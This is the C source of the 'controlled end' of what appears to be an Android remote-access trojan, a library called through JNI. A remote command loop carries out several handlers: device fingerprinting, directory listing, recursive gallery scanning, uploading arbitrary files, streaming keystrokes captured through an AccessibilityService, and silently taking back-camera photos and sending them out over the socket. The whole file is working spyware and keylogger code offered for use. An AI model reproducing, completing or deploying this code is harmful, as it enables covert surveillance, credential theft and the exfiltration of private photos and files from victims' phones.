/*
 * socket_client.c — Android 被控端核心逻辑（库模式，供 JNI 调用）
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <fcntl.h>
#include <android/log.h>

#include <camera/NdkCameraManager.h>
#include <camera/NdkCameraDevice.h>
#include <camera/NdkCameraCaptureSession.h>
#include <camera/NdkCameraMetadataTags.h>
#include <media/NdkImageReader.h>

#include "include/common.h"

#define TAG "ClientNDK"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,  TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, TAG, __VA_ARGS__)

/* ── 全局状态 ─────────────────────────────────────────── */
int  g_sock            = -1;
volatile int g_running = 0;
volatile int g_keylog_running = 0;
static pthread_t g_keylog_thread;

/* ── 键盘事件回调（由 Java AccessibilityService 调用） ── */
// 存储最近的键盘事件，供 keylog 线程发送
#define KEYEVENT_BUF_SIZE 256
static char g_keyevent_buf[KEYEVENT_BUF_SIZE];
static pthread_mutex_t g_keyevent_mutex = PTHREAD_MUTEX_INITIALIZER;
static volatile int g_keyevent_pending  = 0;

void client_on_key_event(const char *key_text) {
    pthread_mutex_lock(&g_keyevent_mutex);
    strncpy(g_keyevent_buf, key_text, KEYEVENT_BUF_SIZE - 1);
    g_keyevent_pending = 1;
    pthread_mutex_unlock(&g_keyevent_mutex);
}

/* ── 1. 系统信息 ──────────────────────────────────────── */
void handle_sysinfo(int sock) {
    char buf[BUFFER_SIZE];
    int len = 0;
    len += snprintf(buf + len, sizeof(buf) - len, "OK:");

    FILE *f = fopen("/system/build.prop", "r");
    if (f) {
        char line[256];
        const char *keys[] = {
            "ro.product.model", "ro.product.brand",
            "ro.build.version.release", "ro.build.version.sdk",
            "ro.product.cpu.abi", NULL
        };
        while (fgets(line, sizeof(line), f) && len < BUFFER_SIZE - 256) {
            for (int i = 0; keys[i]; i++) {
                if (strncmp(line, keys[i], strlen(keys[i])) == 0) {
                    line[strcspn(line, "\n")] = 0;
                    len += snprintf(buf + len, sizeof(buf) - len, "%s\n", line);
                }
            }
        }
        fclose(f);
    }

    f = fopen("/proc/meminfo", "r");
    if (f) {
        char line[128];
        int count = 0;
        while (fgets(line, sizeof(line), f) && count < 3) {
            line[strcspn(line, "\n")] = 0;
            len += snprintf(buf + len, sizeof(buf) - len, "%s\n", line);
            count++;
        }
        fclose(f);
    }

    f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[128];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "Hardware", 8) == 0 ||
                strncmp(line, "model name", 10) == 0) {
                line[strcspn(line, "\n")] = 0;
                len += snprintf(buf + len, sizeof(buf) - len, "%s\n", line);
                break;
            }
        }
        fclose(f);
    }

    len += snprintf(buf + len, sizeof(buf) - len, "\nEND\n");
    send(sock, buf, len, 0);
}

/* ── 2. 目录列表 ──────────────────────────────────────── */
void handle_listdir(int sock, const char *path) {
    char buf[BUFFER_SIZE];
    int len = 0;

    DIR *dir = opendir(path);
    if (!dir) {
        snprintf(buf, sizeof(buf), "ERR:无法打开目录: %s (%s)", path, strerror(errno));
        send(sock, buf, strlen(buf), 0);
        return;
    }

    len += snprintf(buf + len, sizeof(buf) - len, "OK:");
    struct dirent *entry;
    struct stat st;
    char full_path[MAX_PATH_LEN];

    while ((entry = readdir(dir)) != NULL && len < BUFFER_SIZE - 256) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        char type = '-';
        long size = 0;
        if (stat(full_path, &st) == 0) {
            type = S_ISDIR(st.st_mode) ? 'd' : 'f';
            size = (long)st.st_size;
        }
        len += snprintf(buf + len, sizeof(buf) - len,
                        "[%c] %-40s %ld bytes\n", type, entry->d_name, size);
    }
    closedir(dir);
    len += snprintf(buf + len, sizeof(buf) - len, "\nEND\n");
    send(sock, buf, len, 0);
}

/* ── 3. 图库列表 ──────────────────────────────────────── */
static void scan_images(const char *dir_path, char *buf, int *len, int max) {
    DIR *dir = opendir(dir_path);
    if (!dir) return;

    struct dirent *entry;
    struct stat st;
    char full[MAX_PATH_LEN];

    while ((entry = readdir(dir)) != NULL && *len < max - 512) {
        if (entry->d_name[0] == '.') continue;
        snprintf(full, sizeof(full), "%s/%s", dir_path, entry->d_name);
        if (stat(full, &st) != 0) continue;
        if (S_ISDIR(st.st_mode)) {
            scan_images(full, buf, len, max);
        } else {
            const char *ext = strrchr(entry->d_name, '.');
            if (ext && (strcasecmp(ext, ".jpg") == 0 ||
                        strcasecmp(ext, ".jpeg") == 0 ||
                        strcasecmp(ext, ".png") == 0 ||
                        strcasecmp(ext, ".webp") == 0)) {
                *len += snprintf(buf + *len, max - *len,
                                 "%s  [%ld KB]\n", full, (long)st.st_size / 1024);
            }
        }
    }
    closedir(dir);
}

void handle_gallery(int sock) {
    char buf[BUFFER_SIZE];
    int len = 0;
    len += snprintf(buf + len, sizeof(buf) - len, "OK:");

    const char *paths[] = {
        "/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/Download",
        "/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures", NULL
    };
    for (int i = 0; paths[i]; i++) {
        struct stat st;
        if (stat(paths[i], &st) == 0 && S_ISDIR(st.st_mode)) {
            len += snprintf(buf + len, sizeof(buf) - len, "\n=== %s ===\n", paths[i]);
            scan_images(paths[i], buf, &len, sizeof(buf) - 64);
        }
    }
    len += snprintf(buf + len, sizeof(buf) - len, "\nEND\n");
    send(sock, buf, len, 0);
}

/* ── 4. 获取文件 ──────────────────────────────────────── */
void handle_getfile(int sock, const char *path) {
    struct stat st;
    if (stat(path, &st) != 0) {
        char err[256];
        snprintf(err, sizeof(err), "ERR:文件不存在: %s", path);
        send(sock, err, strlen(err), 0);
        return;
    }
    long fsize = (long)st.st_size;
    if (fsize > 10 * 1024 * 1024) {
        char err[64];
        snprintf(err, sizeof(err), "ERR:文件过大 (%ld bytes)", fsize);
        send(sock, err, strlen(err), 0);
        return;
    }
    char header[64];
    int hlen = snprintf(header, sizeof(header), "DATA:%ld\n", fsize);
    send(sock, header, hlen, 0);

    FILE *f = fopen(path, "rb");
    if (!f) { send(sock, "ERR:无法读取文件", 16, 0); return; }
    char chunk[4096];
    size_t n;
    while ((n = fread(chunk, 1, sizeof(chunk), f)) > 0)
        send(sock, chunk, (int)n, 0);
    fclose(f);
}

/* ── 5. 键盘监听（通过 AccessibilityService 回调）──────── */
static void *keylog_thread_func(void *arg) {
    int sock = *(int *)arg;
    char msg[KEYEVENT_BUF_SIZE + 16];
    send(sock, "OK:键盘监听已启动\n", 20, 0);

    while (g_keylog_running) {
        pthread_mutex_lock(&g_keyevent_mutex);
        if (g_keyevent_pending) {
            int mlen = snprintf(msg, sizeof(msg), "KEYEVENT:%s\n", g_keyevent_buf);
            g_keyevent_pending = 0;
            pthread_mutex_unlock(&g_keyevent_mutex);
            send(sock, msg, mlen, 0);
        } else {
            pthread_mutex_unlock(&g_keyevent_mutex);
            usleep(20000); // 20ms 轮询
        }
    }
    return NULL;
}

void handle_keylog_start(int sock) {
    if (g_keylog_running) return;
    g_keylog_running = 1;
    pthread_create(&g_keylog_thread, NULL, keylog_thread_func, &g_sock);
}

void handle_keylog_stop(int sock) {
    g_keylog_running = 0;
    pthread_join(g_keylog_thread, NULL);
    send(sock, "OK:键盘监听已停止\n", 20, 0);
}

/* ── 6. 摄像头拍照 ────────────────────────────────────── */
static ACameraManager *g_cam_mgr     = NULL;
static ACameraDevice  *g_cam_dev     = NULL;
static ACameraCaptureSession *g_cam_session = NULL;
static AImageReader   *g_img_reader  = NULL;
static volatile int    g_capture_done = 0;
static const char     *CAPTURE_PATH  = "/sdcard/kiro_cap.jpg";

static void on_image_available(void *ctx, AImageReader *reader) {
    AImage *image = NULL;
    if (AImageReader_acquireLatestImage(reader, &image) != AMEDIA_OK) return;
    uint8_t *data = NULL; int len = 0;
    AImage_getPlaneData(image, 0, &data, &len);
    if (data && len > 0) {
        FILE *f = fopen(CAPTURE_PATH, "wb");
        if (f) { fwrite(data, 1, len, f); fclose(f); }
    }
    AImage_delete(image);
    g_capture_done = 1;
}

static void on_session_ready(void *ctx, ACameraCaptureSession *session) {
    ACaptureRequest *req = NULL;
    ACameraOutputTarget *out = NULL;
    ANativeWindow *win = NULL;
    AImageReader_getWindow(g_img_reader, &win);
    ACameraDevice_createCaptureRequest(g_cam_dev, TEMPLATE_STILL_CAPTURE, &req);
    ACameraOutputTarget_create(win, &out);
    ACaptureRequest_addTarget(req, out);
    ACameraCaptureSession_capture(session, NULL, 1, &req, NULL);
    ACaptureRequest_free(req);
    ACameraOutputTarget_free(out);
}

static void on_session_closed(void *ctx, ACameraCaptureSession *s) {}
static void on_session_active(void *ctx, ACameraCaptureSession *s) {}
static void on_device_disconnected(void *ctx, ACameraDevice *d) {}
static void on_device_error(void *ctx, ACameraDevice *d, int e) {}

void handle_camera_capture(int sock) {
    g_capture_done = 0;
    g_cam_mgr = ACameraManager_create();
    if (!g_cam_mgr) { send(sock, "ERR:CameraManager失败", 22, 0); return; }

    ACameraIdList *list = NULL;
    ACameraManager_getCameraIdList(g_cam_mgr, &list);
    if (!list || list->numCameras == 0) {
        send(sock, "ERR:未找到摄像头", 18, 0);
        ACameraManager_delete(g_cam_mgr); return;
    }

    const char *cam_id = list->cameraIds[0];
    for (int i = 0; i < list->numCameras; i++) {
        ACameraMetadata *meta = NULL;
        ACameraManager_getCameraCharacteristics(g_cam_mgr, list->cameraIds[i], &meta);
        if (meta) {
            ACameraMetadata_const_entry e;
            ACameraMetadata_getConstEntry(meta, ACAMERA_LENS_FACING, &e);
            if (e.data.u8[0] == ACAMERA_LENS_FACING_BACK)
                cam_id = list->cameraIds[i];
            ACameraMetadata_free(meta);
        }
    }

    AImageReader_new(1920, 1080, AIMAGE_FORMAT_JPEG, 2, &g_img_reader);
    AImageReader_ImageListener img_listener = {NULL, on_image_available};
    AImageReader_setImageListener(g_img_reader, &img_listener);

    ACameraDevice_StateCallbacks dev_cb = {NULL, on_device_disconnected, on_device_error};
    ACameraManager_openCamera(g_cam_mgr, cam_id, &dev_cb, &g_cam_dev);
    usleep(500000);

    ANativeWindow *win = NULL;
    AImageReader_getWindow(g_img_reader, &win);
    ACaptureSessionOutputContainer *outputs = NULL;
    ACaptureSessionOutputContainer_create(&outputs);
    ACaptureSessionOutput *out = NULL;
    ACaptureSessionOutput_create(win, &out);
    ACaptureSessionOutputContainer_add(outputs, out);

    ACameraCaptureSession_stateCallbacks sess_cb = {
        NULL, on_session_closed, on_session_active, on_session_ready
    };
    ACameraDevice_createCaptureSession(g_cam_dev, outputs, &sess_cb, &g_cam_session);

    int timeout = 50;
    while (!g_capture_done && timeout-- > 0) usleep(100000);

    if (g_cam_session) ACameraCaptureSession_close(g_cam_session);
    if (g_cam_dev)     ACameraDevice_close(g_cam_dev);
    if (g_img_reader)  AImageReader_delete(g_img_reader);
    ACaptureSessionOutputContainer_free(outputs);
    ACaptureSessionOutput_free(out);
    ACameraManager_deleteCameraIdList(list);
    ACameraManager_delete(g_cam_mgr);
    g_cam_mgr = NULL; g_cam_dev = NULL; g_cam_session = NULL; g_img_reader = NULL;

    if (!g_capture_done) { send(sock, "ERR:拍照超时", 14, 0); return; }

    struct stat st;
    if (stat(CAPTURE_PATH, &st) != 0) { send(sock, "ERR:图片不存在", 16, 0); return; }

    char header[64];
    int hlen = snprintf(header, sizeof(header), "DATA:%ld\n", (long)st.st_size);
    send(sock, header, hlen, 0);
    FILE *f = fopen(CAPTURE_PATH, "rb");
    if (f) {
        char chunk[4096]; size_t n;
        while ((n = fread(chunk, 1, sizeof(chunk), f)) > 0)
            send(sock, chunk, (int)n, 0);
        fclose(f);
    }
}

/* ── 主命令循环（供 JNI 调用）────────────────────────── */
void client_run_loop(int sock) {
    g_sock    = sock;
    g_running = 1;
    char buf[BUFFER_SIZE];

    LOGI("命令循环启动");
    while (g_running) {
        memset(buf, 0, sizeof(buf));
        int n = recv(sock, buf, sizeof(buf) - 1, 0);
        if (n <= 0) { LOGI("连接断开"); break; }
        buf[n] = '\0';
        LOGI("收到命令: %s", buf);

        if (strcmp(buf, CMD_SYSINFO) == 0) {
            handle_sysinfo(sock);
        } else if (strncmp(buf, CMD_LISTDIR, strlen(CMD_LISTDIR)) == 0) {
            handle_listdir(sock, buf + strlen(CMD_LISTDIR));
        } else if (strcmp(buf, CMD_GALLERY) == 0) {
            handle_gallery(sock);
        } else if (strncmp(buf, CMD_GETFILE, strlen(CMD_GETFILE)) == 0) {
            handle_getfile(sock, buf + strlen(CMD_GETFILE));
        } else if (strcmp(buf, CMD_KEYLOG_START) == 0) {
            handle_keylog_start(sock);
        } else if (strcmp(buf, CMD_KEYLOG_STOP) == 0) {
            handle_keylog_stop(sock);
        } else if (strcmp(buf, CMD_CAMERA_CAPTURE) == 0) {
            handle_camera_capture(sock);
        } else if (strcmp(buf, CMD_EXIT) == 0) {
            LOGI("收到退出指令");
            break;
        }
    }
    g_running = 0;
    close(sock);
    g_sock = -1;
}
